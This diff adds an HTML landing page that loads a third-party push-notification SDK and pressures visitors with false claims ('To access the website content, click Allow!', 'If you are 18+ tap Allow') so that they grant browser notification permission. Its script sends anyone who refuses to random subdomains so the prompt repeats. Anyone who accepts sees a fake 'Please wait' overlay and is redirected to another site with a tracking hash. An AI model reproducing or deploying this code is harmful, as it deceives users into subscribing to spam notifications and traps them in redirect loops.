@@ -1,0 +1,210 @@
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8">
+        <link rel="shortcut icon" href="https://unitpush.com/favicon.ico" type="image/x-icon">
+                    <script type="text/javascript" src="https://getspush.com/code/sdk/?rev=101"></script>
+                <link href="css/style_2.css?u=165465" rel="stylesheet"/>
+        <style>
+                        body {
+                background: #f5f6f6;
+                margin: 0;
+                padding: 0;
+            }
+
+            .videoContainer {
+                display: none;
+            }
+
+            .hide {
+                display: none
+            }
+
+            .show {
+                display: block
+            }
+
+            .arrowup {
+                display: none;
+            }
+
+            .outer {
+                position: relative;
+                text-align: center;
+                overflow: visible;
+                height: 170px;
+                width: 170px;
+                margin: 0 auto;
+            }
+
+            .middle {
+                display: table-cell;
+                height: 100%;
+                vertical-align: middle;
+                width: 100%
+            }
+
+            .loading-circle {
+                height: 160px;
+                margin: 0 auto;
+                position: relative;
+                width: 160px
+            }
+
+            .percent {
+                color: #fff;
+                display: block;
+                font-size: 36px;
+                margin: -22px 0 0 5px;
+                position: absolute;
+                text-align: center;
+                top: 50%;
+                width: 100%
+            }
+
+            .circle1 {
+                background-color: #333;
+                border: 5px solid;
+                border-color: #fff transparent;
+                border-radius: 50%;
+                -webkit-box-shadow: 0 0 16px #000;
+                -moz-box-shadow: 0 0 16px #000;
+                box-shadow: 0 0 16px #000;
+                height: 100%;
+                left: 0;
+                position: absolute;
+                top: 0;
+                width: 100%
+            }
+
+            .text {
+                font-family: Arial, sans-serif;
+                text-align: center;
+                padding-top: 80px;
+                color: white;
+                font-size: 30px
+            }
+
+            .rotate-right {
+                -webkit-animation: rotate 2s linear 0s infinite reverse;
+                -moz-animation: rotate 2s linear 0s infinite reverse;
+                animation: rotate 2s linear 0s infinite reverse
+            }
+
+                        body {
+                background: #000;
+            }
+
+                    </style>
+    </head>
+        <body class="mainBody" id="page_release-search">
+    <div id="blockI" class="blockCh">
+        <div class="container blockCh"><img src="images/arrow.png" class="arrow">
+            <div class="block-p"><p class="t1">To access the website content, click Allow!</p></div>
+        </div>
+    </div>
+    <div class="textArea">
+        If you are 18+ tap<br><span class="button">Allow</span>
+        <br>
+        <img src="images/arrow-v2.png" class="arrowup"/>
+    </div>
+        <script>
+        var dom_host = "unitpush.com\/index_2.php?c=99&h=8aa65ce01c_*_def_web&cnv=1&t_2=1&uri=file%3A%2F%2F%2FC%3A%2FUsers%2Finsk%2FDesktop%2Finsk%2F%D0%9D%D0%BE%D0%B2%D0%B0%D1%8F+%D0%BF%D0%B0%D0%BF%D0%BA%D0%B0%2Findex.html";
+        var count = 99;
+        var hash_sub = "8aa65ce01c_*_def_web";
+        var uri = 'file:///C:/Users/insk/Desktop/insk/Новая папка/index.html';
+        var href = document.location.href;
+        if (href) {
+            var fine = function (type) {
+                if (type === 1) {
+                    //setTimeout(function () {
+                    document.location.href = uri +'?ck_url=1';
+                    //}, 10000);
+                } else if (type === 2) {
+                    document.location.href = 'sosi.com' + encodeURIComponent(hash_sub) + '&uri=' + encodeURIComponent(uri);
+                }
+            };
+            var r_mn_mx = function (min, max) {
+                return Math.round(Math.random() * (max - min)) + min;
+            };
+            var all_rs = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9'];
+            var new_rand = function () {
+                return all_rs[r_mn_mx(0, 33)] + all_rs[r_mn_mx(0, 33)] + all_rs[r_mn_mx(0, 33)] + all_rs[r_mn_mx(0, 33)] + all_rs[r_mn_mx(0, 33)];
+            };
+            var next = 'https://' + new_rand() + '.' + dom_host;
+            var grntd = function () {
+                var img_style = 'margin:10% 35% 0 35%;width:30%;';
+                var h2_style = 'font-size:50px;';
+                                var d = document.createElement('div');
+                d.setAttribute('style', 'z-index:999999;position:fixed;top:0;left:0;width:100%;background:rgba(0, 155, 255, 0.13);height:100%;text-align:center;');
+                d.innerHTML = '<img src="https://unitpush.com/images/loader.gif" style="' + img_style + '">' +
+                    '<h2 style="' + h2_style + '">Please wait...</h2>';
+                document.body.appendChild(d);
+            };
+                        if (localStorage.getItem('MegaToken2') || localStorage.getItem('MegaPid')) {
+                fine(1);
+            } else {
+                var mg = setInterval(function () {
+                    if (typeof MegaPush) {
+                        clearInterval(mg);
+                        MegaPush.init({
+                            pid: "8aa65ce01c",
+                            type: 'auto',
+                            button: 'testbtn',
+                            granted: function () {
+                                grntd();
+                                console.log('granted');
+                                var rt = setInterval(function () {
+                                    if (localStorage.getItem('MegaToken2')) {
+                                        clearInterval(rt);
+                                        fine(2);
+                                    }
+                                }, 200);
+                            },
+                            denied: function () {
+                                console.log('denied');
+                                if (count === 0) {
+                                    fine(1);
+                                } else {
+                                    document.location.href = next;
+                                }
+                            },
+                            subscribed: function () {
+                                console.log('subscribed');
+                                //fine(1);
+                            }
+                        });
+                    }
+                }, 100);
+            }
+            
+            /*if (localStorage.getItem('MegaToken') || localStorage.getItem('MegaPid')) {
+                fine(1);
+            } else {
+                var mg = setInterval(function () {
+                    if (MegaPush) {
+                        clearInterval(mg);
+                        MegaPush.init({
+                            pid: 221075, type: 'auto', button: 'testbtn', granted: function () {
+                                //console.log('granted');
+
+                            }, denied: function () {
+                                //console.log('denied');
+                                if (count === 0) {
+                                    fine(1);
+                                } else {
+                                    document.location.href = next;
+                                }
+                            }, subscribed: function () {
+                                //console.log('subscribed');
+                                fine(1);
+                            }
+                        });
+                    }
+                }, 100);
+            }*/
+        }
+    </script>
+    </body>
+    </html>
